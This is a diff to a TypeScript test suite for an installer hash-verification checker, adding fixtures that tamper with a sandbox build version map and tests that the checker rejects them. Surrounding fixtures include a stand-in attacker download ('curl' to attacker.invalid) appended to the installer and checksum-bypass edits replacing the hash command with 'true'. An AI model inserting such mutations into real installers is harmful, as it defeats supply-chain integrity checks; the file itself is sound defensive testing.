@@ -1,6 +1,7 @@
 // SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
 // SPDX-License-Identifier: Apache-2.0
 
+import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
 import { createHash } from "node:crypto";
 import fs from "node:fs";
@@ -90,6 +91,7 @@ type FixtureMode =
   | "installer-comment-decoy"
   | "installer-dead-code-decoy"
   | "installer-decoy-table"
+  | "installer-dev-min-version-drift"
   | "installer-extra-download"
   | "installer-indirect-selector-override"
   | "installer-later-min-selector-override"
@@ -97,6 +99,13 @@ type FixtureMode =
   | "installer-literalized-pin-input"
   | "installer-min-version-drift"
   | "installer-pin-selector-drift"
+  | "installer-sandbox-build-control-flow"
+  | "installer-sandbox-build-duplicate-digest"
+  | "installer-sandbox-build-literalized-input"
+  | "installer-sandbox-build-literalized-selector"
+  | "installer-sandbox-build-malformed-version"
+  | "installer-sandbox-build-pin-change"
+  | "installer-sandbox-build-unknown-command"
   | "installer-sha-command-bypass"
   | "mismatched-table-versions"
   | "missing-brev-pin"
@@ -190,6 +199,24 @@ const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> =
       'stable | auto) OPENSHELL_VERSION="v0.0.82" ;;',
     ),
 };
+const mutateSandboxBuildFunction = (
+  source: string,
+  mutate: (functionSource: string) => string,
+): string => {
+  const start = source.indexOf("pinned_sandbox_build_version() {");
+  const end = source.indexOf("\ncomponent_build_version() {", start);
+  assert.notEqual(start, -1, "sandbox build function start marker must exist");
+  assert.notEqual(end, -1, "sandbox build function end marker must exist");
+  const functionSource = source.slice(start, end);
+  const mutated = mutate(functionSource);
+  assert.notEqual(
+    mutated,
+    functionSource,
+    "sandbox build fixture mutation must change the function",
+  );
+  return `${source.slice(0, start)}${mutated}${source.slice(end)}`;
+};
+
 const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
   "installer-bypassed-comparison": (source) =>
     source.replace('[ "$release_sha" = "$expected_sha" ]', "true"),
@@ -227,6 +254,8 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
       'openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
       'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
     ),
+  "installer-dev-min-version-drift": (source) =>
+    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.82"'),
   "installer-extra-download": (source) =>
     `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
   "installer-indirect-selector-override": (source) =>
@@ -241,6 +270,51 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
     source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.82"'),
   "installer-pin-selector-drift": (source) =>
     source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
+  "installer-sandbox-build-control-flow": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace("return 1", "return 0"),
+    ),
+  "installer-sandbox-build-duplicate-digest": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace(
+        "      32ca44fe7d9e6d332f2a753c6b8a1a6117b7388281dad9b5274d23ffc67e216f)",
+        "      32ca44fe7d9e6d332f2a753c6b8a1a6117b7388281dad9b5274d23ffc67e216f | \\\n      f9f991a24d10772ad5d24ae27a8ea6baad8cac671695bd90fcd0355e0e0ad198)",
+      ),
+    ),
+  "installer-sandbox-build-literalized-input": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace('local digest="$1"', "local digest='$1'"),
+    ),
+  "installer-sandbox-build-literalized-selector": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace('case "$digest" in', "case '$digest' in"),
+    ),
+  "installer-sandbox-build-malformed-version": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace(`printf '%s\\n' "0.0.72"`, `printf '%s\\n' "v0.0.72"`),
+    ),
+  "installer-sandbox-build-pin-change": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace(
+        `      printf '%s\\n' "0.0.72"
+      ;;
+    *)`,
+        `      printf '%s\\n' "0.0.72"
+      ;;
+    145246049bd73c60452ac3c2b4b1801663196c8e2f80575af820289c78c1cf09 | \\
+      76bc19b70d9f1e1e9871307045796cd39cc7b8fc4c08ffc90593cc934f36d500)
+      printf '%s\\n' "0.0.82"
+      ;;
+    *)`,
+      ),
+    ),
+  "installer-sandbox-build-unknown-command": (source) =>
+    mutateSandboxBuildFunction(source, (functionSource) =>
+      functionSource.replace(
+        `      printf '%s\\n' "0.0.72"`,
+        `      printf '%s\\n' "0.0.72"\n      echo unexpected`,
+      ),
+    ),
   "installer-sha-command-bypass": (source) =>
     source.replace('SHA_CMD="sha256sum"', 'SHA_CMD="true"'),
   "multiple-installer-versions": (source) =>
@@ -417,13 +491,29 @@ function renderInstallerTemplate(openshellVersion: string, pinFunction: string):
   const selected = INSTALLER_TEMPLATE.replace(
     /^MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
     `MIN_VERSION="${openshellVersion}"`,
-  ).replace(/^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m, `MAX_VERSION="${openshellVersion}"`);
-  return replacePinFunction(
+  )
+    .replace(/^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m, `MAX_VERSION="${openshellVersion}"`)
+    .replace(
+      /^DEV_MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
+      `DEV_MIN_VERSION="${openshellVersion}"`,
+    );
+  const withPinFunction = replacePinFunction(
     selected,
     "openshell_pinned_sha256",
     "openshell_checksum_line",
     pinFunction,
   );
+  const sandboxFunctionStart = withPinFunction.indexOf("pinned_sandbox_build_version() {");
+  const sandboxFunctionEnd = withPinFunction.indexOf(
+    "\ncomponent_build_version() {",
+    sandboxFunctionStart,
+  );
+  expect(sandboxFunctionStart, "sandbox build map template start").not.toBe(-1);
+  expect(sandboxFunctionEnd, "sandbox build map template end").not.toBe(-1);
+  const sandboxFunction = withPinFunction
+    .slice(sandboxFunctionStart, sandboxFunctionEnd)
+    .replaceAll("printf '%s\\n' \"0.0.72\"", `printf '%s\\n' "${openshellVersion}"`);
+  return `${withPinFunction.slice(0, sandboxFunctionStart)}${sandboxFunction}${withPinFunction.slice(sandboxFunctionEnd)}`;
 }
 
 function renderBrevTemplate(openshellVersion: string, pinFunction: string): string {
@@ -450,7 +540,9 @@ function createFixture(
   tempDirs.push(fixtureRoot);
   fs.mkdirSync(checksDir, { recursive: true });
   fs.mkdirSync(binDir, { recursive: true });
-  fs.mkdirSync(path.join(fixtureRoot, "nemoclaw-blueprint"), { recursive: true });
+  fs.mkdirSync(path.join(fixtureRoot, "nemoclaw-blueprint"), {
+    recursive: true,
+  });
   const checker = fs.readFileSync(
     path.join(REPO_ROOT, "scripts", "check-installer-hash.sh"),
     "utf8",
@@ -650,6 +742,28 @@ describe("installer hash verification", () => {
     expect(afterPrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");
   });
 
+  it("permits structurally parsed sandbox build release-data additions", () => {
+    const result = runFixture("installer-sandbox-build-pin-change", undefined, true);
+
+    expect(result.status).toBe(0);
+    expect(result.stdout).toContain("All installer hashes are current");
+  });
+
+  it.each([
+    "installer-sandbox-build-control-flow",
+    "installer-sandbox-build-duplicate-digest",
+    "installer-sandbox-build-literalized-input",
+    "installer-sandbox-build-literalized-selector",
+    "installer-sandbox-build-malformed-version",
+    "installer-sandbox-build-unknown-command",
+  ] as const)("rejects untrusted sandbox build map mutation %s", (mode) => {
+    const result = runFixture(mode, undefined, true);
+
+    expect(result.status).toBe(1);
+    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
+    expect(result.stdout).not.toContain("All installer hashes are current");
+  });
+
   it("fails closed when an allowlisted release lacks all three manifest digests", () => {
     const result = runFixture("incomplete-trusted-allowlist", undefined, true);
 
@@ -681,6 +795,10 @@ describe("installer hash verification", () => {
     [
       "installer-max-version-drift",
       "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.82",
+    ],
+    [
+      "installer-dev-min-version-drift",
+      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.82",
     ],
     [
       "brev-stable-version-drift",
